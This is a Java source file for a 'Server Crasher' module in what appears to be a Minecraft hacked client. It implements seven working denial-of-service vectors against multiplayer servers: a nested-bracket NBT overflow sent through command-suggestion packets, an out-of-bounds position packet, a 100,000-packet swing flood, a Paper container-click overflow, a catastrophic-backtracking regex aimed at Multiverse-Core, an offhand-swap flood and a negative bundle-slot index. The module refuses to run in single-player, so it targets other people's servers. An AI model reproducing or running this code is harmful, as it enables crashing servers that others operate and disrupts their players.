package com.dioxideliteng.module.misc;

import com.dioxideliteng.event.Event;
import com.dioxideliteng.event.Events;
import com.dioxideliteng.event.impl.EventWorld;
import com.dioxideliteng.module.Category;
import com.dioxideliteng.module.Feature;
import com.dioxideliteng.setting.ModeSetting;
import com.dioxideliteng.setting.NumberSetting;
import com.dioxideliteng.ui.dynamicIsland.DynamicIslandManager;
import com.dioxideliteng.util.krs.HotbarItemSlot;
import com.dioxideliteng.util.krs.ItemSlotUtil;
import com.dioxideliteng.util.krs.MSTimer;
import com.dioxideliteng.util.krs.PacketUtil;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import java.util.Locale;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.network.HashedStack;
import net.minecraft.network.protocol.game.ServerboundCommandSuggestionPacket;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;
import net.minecraft.network.protocol.game.ServerboundPlayerActionPacket;
import net.minecraft.network.protocol.game.ServerboundPunchPacket;
import net.minecraft.network.protocol.game.ServerboundSelectBundleItemPacket;
import net.minecraft.world.inventory.ContainerInput;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;

/**
 * Ported from Krs (com.instrumentalist.krs.hacks.features.exploit.ServerCrasher).
 * Krs parity: seven crash vectors (Meteor Addon JSON overflow, out-of-bounds position,
 * hand-swing flood, Paper window-click overflow, Multiverse-Core regex, offhand-switch
 * flood, bundle slot underflow). Every vector logs "Crashing..." and self-disables after
 * firing; single-player is refused. The Krs notification/chat output is mapped onto the
 * client's DynamicIslandManager notifications.
 */
public class ServerCrasher extends Feature {
   private final ModeSetting mode = new ModeSetting("Mode", this, "Meteor Addon",
         new String[]{"Meteor Addon", "Position", "Hand Swing", "Paper Window Overflow",
               "Multiverse Core", "Offhand Switch", "Bundle"});
   private final NumberSetting switchThreads = new NumberSetting("SwitchThreads", this, 10.0, 1.0, 100.0, 1.0);
   private final NumberSetting packets = new NumberSetting("Packets", this, 6.0, 1.0, 12.0, 1.0);
   private final NumberSetting length = new NumberSetting("Length", this, 2032.0, 1000.0, 3000.0, 1.0);

   private final MSTimer crashTimer = new MSTimer();
   private int messageIndex = 0;
   private final String message = "msg @a[nbt={PAYLOAD}]";
   private final String nbtExecutor = " @a[nbt={PAYLOAD}]";

   private final String[] knownWorkingMessages = {
         "msg",
         "minecraft:msg",
         "tell",
         "minecraft:tell",
         "tm",
         "teammsg",
         "minecraft:teammsg",
         "minecraft:w",
         "minecraft:me"
   };

   public ServerCrasher() {
      super("Server Crasher", Category.MISC);
      this.switchThreads.setVisible(() -> this.mode.is("Offhand Switch"));
      this.packets.setVisible(() -> this.mode.is("Meteor Addon") || this.mode.is("Paper Window Overflow"));
      this.length.setVisible(() -> this.mode.is("Meteor Addon"));
   }

   @Override
   public void onDisable() {
      messageIndex = 0;
   }

   @Override
   public void onEnable() {
      if (mc.player == null) return;

      if (mc.hasSingleplayerServer()) {
         DynamicIslandManager.notifyInfo("Server Crasher", "Server Crasher was disabled on single player!");
         toggle();
         return;
      }

      if (this.mode.getValue().toLowerCase(Locale.ROOT).equals("meteor addon")) {
         String overflow = generateJsonObject((int) this.length.getValue());
         String partialCommand = message.replace("{PAYLOAD}", overflow);
         crashLog();

         for (int i = 0; i < (int) this.packets.getValue(); i++)
            PacketUtil.sendPacket(new ServerboundCommandSuggestionPacket(0, partialCommand));

         toggle();
      }
   }

   @Override
   public void onEvent(Event event) {
      if (event instanceof EventWorld) {
         toggle();
         return;
      }
      if (event == Events.TICK) {
         this.setSuffix(this.mode.getValue());
         return;
      }
      if (event != Events.UPDATE) return;

      var player = mc.player;
      if (player == null) return;

      if (mc.hasSingleplayerServer()) {
         DynamicIslandManager.notifyInfo("Server Crasher", "Server Crasher was disabled on single player!");
         toggle();
         return;
      }

      switch (this.mode.getValue().toLowerCase(Locale.ROOT)) {
         case "multiverse core" -> {
            player.connection.sendCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            crashLog();
            toggle();
         }
         case "position" -> {
            var position = player.position();
            PacketUtil.sendPacket(new ServerboundMovePlayerPacket.Pos(
                  position.x + 99413,
                  player.getBoundingBox().minY,
                  position.z + 99413,
                  true,
                  player.horizontalCollision
            ));
            crashLog();
            toggle();
         }
         case "hand swing" -> {
            if (crashTimer.hasTimePassed(10L)) {
               for (int i = 0; i < 100000; i++)
                  // ServerboundSwingPacket was removed in 26.3; the serverbound swing notification
                  // is now the parameterless ServerboundPunchPacket (see Minecraft.startAttack).
                  PacketUtil.sendPacket(ServerboundPunchPacket.INSTANCE);
               crashLog();
               crashTimer.reset();
            }
            toggle();
         }
         case "offhand switch" -> {
            for (int i = 0; i < (int) this.switchThreads.getValue(); i++) {
               PacketUtil.sendPacket(new ServerboundPlayerActionPacket(
                     ServerboundPlayerActionPacket.Action.SWAP_ITEM_WITH_OFFHAND,
                     BlockPos.ZERO,
                     Direction.DOWN
               ));
            }
            crashLog();
            toggle();
         }
         case "bundle" -> {
            var gameMode = mc.gameMode;
            if (gameMode == null) return;
            HotbarItemSlot slot = new HotbarItemSlot(player.getInventory().getSelectedSlot());
            ItemStack itemStack = slot.getItemStack();
            if (!ItemSlotUtil.isBundle(itemStack)) {
               DynamicIslandManager.notifyInfo("Server Crasher", "You have to hold bundle");
               toggle();
               return;
            }

            int slotIdx = slot.getIdForServerWithCurrentScreen() != null ? slot.getIdForServerWithCurrentScreen() : 36;
            int selected = -1337;
            PacketUtil.sendPacket(new ServerboundSelectBundleItemPacket(slotIdx, selected));
            gameMode.useItem(player, slot.getUseHand());
            crashLog();
            toggle();
         }
         case "meteor addon" -> {
            if (messageIndex == knownWorkingMessages.length - 1) {
               messageIndex = 0;
               toggle();
            }

            String knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor;
            int len = 2044 - knownMessage.length();
            String overflow = generateJsonObject(len);
            String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);

            for (int i = 0; i < (int) this.packets.getValue(); i++)
               PacketUtil.sendPacket(new ServerboundCommandSuggestionPacket(0, partialCommand));

            crashLog();
            messageIndex++;
         }
         case "paper window overflow" -> {
            if (player.tickCount % 6 == 0) {
               var menu = player.containerMenu;
               var hashGenerator = (mc.getConnection());
               if (hashGenerator == null) return;
               var generator = hashGenerator.decoratedHashOpsGenenerator();
               for (int i = 0; i < (int) this.packets.getValue(); i++) {
                  PacketUtil.sendPacket(new ServerboundContainerClickPacket(
                        menu.containerId,
                        menu.getStateId(),
                        (short) 36,
                        (byte) -1,
                        ContainerInput.SWAP,
                        Int2ObjectMaps.singleton(0, HashedStack.create(new ItemStack(Items.GOLDEN_CARROT, 1), generator)),
                        HashedStack.create(menu.getCarried().copy(), generator)
                  ));
               }
               crashLog();
            }
         }
      }
   }

   private void crashLog() {
      DynamicIslandManager.notifyInfo("Server Crasher", "Crashing...");
   }

   private String generateJsonObject(int levels) {
      String in = "[".repeat(levels);
      return "{a:" + in + "}";
   }
}
